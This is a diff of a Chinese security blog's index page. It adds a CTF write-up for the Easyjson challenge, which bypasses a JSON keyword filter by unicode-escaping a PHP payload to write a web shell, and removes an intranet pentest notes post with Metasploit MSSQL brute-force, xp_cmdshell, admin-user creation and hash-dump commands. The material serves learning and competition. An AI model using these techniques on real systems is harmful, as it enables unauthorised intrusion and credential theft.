@@ -361,7 +361,7 @@ end</code></pre>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/articles/d5a07c1f3f.html" class="post-title-link" itemprop="url">【转载西湖论剑 Flagshop 分析复现</a>
+            <a href="/articles/d5a07c1f3f.html" class="post-title-link" itemprop="url">【转载】西湖论剑 Flagshop 分析复现</a>
         </h2>
 
         <div class="post-meta">
@@ -378,7 +378,7 @@ end</code></pre>
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-20 11:11:13" itemprop="dateModified" datetime="2020-10-20T11:11:13+08:00">2020-10-20</time>
+                <time title="修改时间：2020-10-20 11:38:44" itemprop="dateModified" datetime="2020-10-20T11:38:44+08:00">2020-10-20</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -656,6 +656,214 @@ echo $open_php;
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                 </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>太菜了只做了一道</p>
+</blockquote>
+<h2 id="Easyjson"><a href="#Easyjson" class="headerlink" title="Easyjson"></a>Easyjson</h2><ul>
+<li>代码审计</li>
+</ul>
+<pre><code class="php"> &lt;?php
+include &#39;security.php&#39;;
+
+if(!isset($_GET[&#39;source&#39;])){
+    show_source(__FILE__);
+    die();
+}
+$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;
+var_dump($sandbox);
+if(!file_exists($sandbox)){
+    mkdir($sandbox);
+    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);
+}
+$action = $_GET[&#39;action&#39;];
+$content = file_get_contents(&quot;php://input&quot;);
+
+
+if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
+    $content = json_decode($content);
+    $filename = $_GET[&#39;filename&#39;];
+    $filecontent = $content-&gt;content;
+    $filename = $sandbox.$filename;
+    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
+}elseif($action == &quot;reset&quot;){
+    $files = scandir($sandbox);
+    foreach($files as $file) {
+        if(!is_dir($file)){
+            if($file !== &quot;index.php&quot;){
+                unlink($sandbox.$file);
+            }
+        }
+    }
+}
+else{
+    die(&#39;Security Check Failed.&#39;);
+}
+</code></pre>
+<ul>
+<li>代码主要部分在,但是这里有一个waf对文件名和content参数进行过滤。简单Fuzz了一下，filename可以使用php后缀，说明可以写php文件，但是有一个很关键的问题就是<code>content</code>它传来必须是一个json,json中有一个属性是content，例如：<code>{&#39;content&#39;:&#39;&lt;?=phpinfo()?&gt;&#39;}</code>但是<code>waf</code>对json进行了过滤，不能存在content这个字符串(还过滤了其他关键字)。</li>
+</ul>
+<pre><code class="php">if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
+    $content = json_decode($content);
+    $filename = $_GET[&#39;filename&#39;];
+    $filecontent = $content-&gt;content;
+    $filename = $sandbox.$filename;
+    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
+}</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001234@2x.png" alt="WX20201009-001234@2x"></p>
+<ul>
+<li>神小密圈发现，json支持的字符中可以支持unicode编码，那么我们全都用unicode编码来代替字符串不就行了？</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG59.jpeg" alt="WechatIMG59"></p>
+<ul>
+<li>简单测试一下发现可以.<a href="https://blog.csdn.net/weixin_30654419/article/details/97554779?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param" target="_blank" rel="noopener">Unicode表</a></li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG72.png" alt="WechatIMG72"></p>
+<ul>
+<li>简单写个脚本来将字符串转化为unicode编码。</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+function unicode_encode($str){
+    $table = [
+            &#39;\u002&#39;=&gt;[&#39; &#39;,&#39;!&#39;,&#39;&quot;&#39;,&#39;#&#39;,&#39;$&#39;,&#39;%&#39;,&#39;&amp;&#39;,&#39;\&#39;&#39;,&#39;(&#39;,&#39;)&#39;,&#39;*&#39;,&#39;+&#39;,&#39;,&#39;,&#39;-&#39;,&#39;.&#39;,&#39;/&#39;],
+            &#39;\u003&#39;=&gt;[&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;:&#39;,&#39;;&#39;,&#39;&lt;&#39;,&#39;=&#39;,&#39;&gt;&#39;,&#39;?&#39;],
+            &#39;\u004&#39;=&gt;[&#39;@&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;],
+            &#39;\u005&#39;=&gt;[&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;[&#39;,&#39;\\&#39;,&#39;]&#39;,&#39;^&#39;,&#39;_&#39;],
+            &#39;\u006&#39;=&gt;[&#39;`&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;],
+            &#39;\u007&#39;=&gt;[&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;{&#39;,&#39;|&#39;,&#39;}&#39;,&#39;~&#39;]
+];
+    foreach ($table as $key =&gt; $value) {
+        $i = 0;
+        foreach ($value as $vcode) {
+            $i=$i+1;
+            if($str==$vcode){
+                return $key.bin2e($i-1);
+            }
+
+        }
+    }
+
+}
+
+function bin2e($str){
+    switch ($str) {
+        case &#39;10&#39;:
+            return &#39;a&#39;;
+            break;
+        case &#39;11&#39;:
+            return &#39;b&#39;;
+            break;
+        case &#39;12&#39;:
+            return &#39;c&#39;;
+            break;
+        case &#39;13&#39;:
+            return &#39;d&#39;;
+            break;
+        case &#39;14&#39;:
+            return &#39;e&#39;;
+            break;
+        case &#39;15&#39;:
+            return &#39;f&#39;;
+            break;
+        default:
+            return $str;
+            break;
+    }
+}
+
+function main($str){
+for($i=0;$i&lt;strlen($str);$i++){
+    echo unicode_encode($str[$i]);
+}
+}
+
+
+main(&#39;&lt;?=phpinfo()?&gt;&#39;);
+?&gt;</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000458@2x.png" alt="WX20201009-000458@2x"></p>
+<ul>
+<li>EXP</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000600@2x.png" alt="WX20201009-000600@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000806@2x.png" alt="WX20201009-000806@2x"></p>
+<ul>
+<li>Getflag</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001124@2x.png" alt="WX20201009-001124@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001031@2x.png" alt></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000938@2x.png" alt="WX20201009-000938@2x"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/2a808de4a49b19.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/2a808de4a49b19.html" class="post-title-link" itemprop="url">西湖论剑Easyjson Write up</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-09 14:33:08 / 修改时间：18:57:51" itemprop="dateCreated datePublished" datetime="2020-10-09T14:33:08+08:00">2020-10-09</time>
             </span>
 
           <br>
@@ -2379,220 +2587,6 @@ app.listen(80, &#39;0.0.0.0&#39;, () =&gt; {
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d729d7601d.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d729d7601d.html" class="post-title-link" itemprop="url">内网渗透学习笔记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-05-21 16:05:57" itemprop="dateCreated datePublished" datetime="2020-05-21T16:05:57+08:00">2020-05-21</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:25:37" itemprop="dateModified" datetime="2020-10-14T17:25:37+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>本文将持续更新。系统记录内网渗透学习。</p>
-<p><strong><em>声明：本文仅研究学习所用，参考文章的一切活动均与本人无关。</em></strong></p>
-<h2 id="内网服务探测"><a href="#内网服务探测" class="headerlink" title="内网服务探测"></a>内网服务探测</h2><h3 id="Netdiscover-探测活动主机"><a href="#Netdiscover-探测活动主机" class="headerlink" title="Netdiscover 探测活动主机"></a>Netdiscover 探测活动主机</h3><ul>
-<li>简介</li>
-</ul>
-<blockquote>
-<p>专用的二层发现工具。拥有主动和被动发现两种方式。</p>
-</blockquote>
-<ul>
-<li>参数</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>意义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-i 网卡</td>
-<td>指定监听的网卡</td>
-</tr>
-<tr>
-<td>-r range</td>
-<td>指定IP段</td>
-</tr>
-<tr>
-<td>-l filename</td>
-<td>从文件中读取IP段</td>
-</tr>
-<tr>
-<td>-p</td>
-<td>被动模式</td>
-</tr>
-<tr>
-<td>-t</td>
-<td>ARP发送间隔</td>
-</tr>
-<tr>
-<td>-c</td>
-<td>发包数量</td>
-</tr>
-</tbody></table>
-<ul>
-<li>使用举例</li>
-</ul>
-<pre><code class="shell">netdiscover i eth0 -r 192.168.3.0/24 #主动探测IP：192.168.3.0/24段存活的主机
-netdiscover -p</code></pre>
-<h3 id="使用Namp探测主机开放服务"><a href="#使用Namp探测主机开放服务" class="headerlink" title="使用Namp探测主机开放服务"></a>使用Namp探测主机开放服务</h3><p>由于已经使用<code>netdiscover</code>探测指定主机的使用Pn参数跳过Pn检测。具体使用参数说明在另一篇文章里讲.</p>
-<pre><code class="shell">nmap -sV -Pn 192.168.3.31</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/blog/20200521142828.png" alt="20200521142828"></p>
-<h2 id="MSF攻击内网服务"><a href="#MSF攻击内网服务" class="headerlink" title="MSF攻击内网服务"></a>MSF攻击内网服务</h2><h3 id="MSF攻击内网SQL-SERVER服务"><a href="#MSF攻击内网SQL-SERVER服务" class="headerlink" title="MSF攻击内网SQL SERVER服务"></a>MSF攻击内网SQL SERVER服务</h3><h4 id="爆破Mssql弱口令"><a href="#爆破Mssql弱口令" class="headerlink" title="爆破Mssql弱口令"></a>爆破Mssql弱口令</h4><ul>
-<li>搜索mssql爆破payload</li>
-</ul>
-<pre><code>search mssql_login</code></pre><ul>
-<li>使用弱口令爆破payload</li>
-</ul>
-<pre><code class="shell">use auxiliary/scanner/mssql/mssql_login
-set rhosts 192.168.3.31
-run</code></pre>
-<ul>
-<li>如果提示:</li>
-</ul>
-<blockquote>
-<p>[*] Error: 192.168.109.139: Metasploit::Framework::LoginScanner::Invalid Cred details can’t be blank, Cred details can’t be blank (Metasploit::Framework::LoginScanner::MSSQL)</p>
-</blockquote>
-<p>则说明mssql不是默认密码需要指定字典进行爆破：</p>
-<pre><code class="shell">use auxiliary/scanner/mssql/mssql_login
-set rhosts 192.168.3.31
-set user_file /root/user.txt
-set pass_file /root/pass.txt
-run</code></pre>
-<ul>
-<li>爆破成功sa密码为admin<br><img src="http://goodcheerleung.gitee.io/blog/20200521143926.png" alt="20200521143926"></li>
-</ul>
-<h4 id="枚举Mssql配置信息"><a href="#枚举Mssql配置信息" class="headerlink" title="枚举Mssql配置信息"></a>枚举Mssql配置信息</h4><ul>
-<li>搜索枚举Mssql配置信息payload</li>
-</ul>
-<pre><code>search mssql_enum</code></pre><ul>
-<li>使用Mssql-enum payload</li>
-</ul>
-<pre><code class="shell">use auxiliary/admin/mssql_enum
-set username sa
-set password admin
-set rhosts 192.168.3.31
-run</code></pre>
-<ul>
-<li>这样可以看到mssql开放的哪些功能能够供我们利用，例如比较重要的就是xp_cmdshell能够直接继承mssql的权限执行系统命令：</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/blog/20200521145004.png" alt="20200521145004"></p>
-<h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><h5 id="xp-cmdshell-执行命令"><a href="#xp-cmdshell-执行命令" class="headerlink" title="xp_cmdshell 执行命令"></a>xp_cmdshell 执行命令</h5><p>使用该模块时候如果<code>xp_cmdshell</code>没有启动将自动激活</p>
-<ul>
-<li>搜索mssql exec攻击脚本</li>
-</ul>
-<pre><code>search mssql_exec</code></pre><ul>
-<li>使用mssql_exec攻击脚本</li>
-</ul>
-<pre><code>use auxiliary/admin/mssql_exec
-set username sa
-set password admin
-set rhosts 192.168.3.31
-set cmd chcp 65001&amp;whoami
-run</code></pre><ul>
-<li>注意chcp 65001改变字符编码解决乱码问题，可以看到返回结果是system，直接添加新用户即可。</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/blog/20200521145639.png" alt="20200521145639"></p>
-<ul>
-<li>增加用户</li>
-</ul>
-<pre><code class="shell">set cmd chcp 65001&amp;net user test abc!123456 /add
-run</code></pre>
-<ul>
-<li>提升权限</li>
-</ul>
-<pre><code class="shell">set cmd chcp 65001&amp;net localgroup administrators test /add</code></pre>
-<h4 id="使用mssql-hashdump-抓取hash"><a href="#使用mssql-hashdump-抓取hash" class="headerlink" title="使用mssql_hashdump 抓取hash"></a>使用mssql_hashdump 抓取hash</h4><pre><code>use auxiliary/scanner/mssql/mssql_hashdump  
-set rhosts 192.168.3.30
-set password admin
-set username sa
-run</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200521224308.png" alt="20200521224308"></p>
-<p><img src="http://goodcheerleung.gitee.io/blog/20200521224355.png" alt="20200521224355"></p>
-<h4 id="执行sql语句"><a href="#执行sql语句" class="headerlink" title="执行sql语句"></a>执行sql语句</h4><pre><code>use auxiliary/admin/mssql/mssql_sql
-set rhosts 192.168.3.30
-set password admin
-set username sa
-set sql set sql Select Name FROM Master.dbo.SysDatabases orDER BY Name
-run </code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200521230010.png" alt="20200521230010"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2664,7 +2658,7 @@ run </code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200521230010
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-count">63</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2735,12 +2729,12 @@ run </code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200521230010
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">225k</span>
+    <span title="站点总字数">229k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:25</span>
+    <span title="站点阅读时长">3:28</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
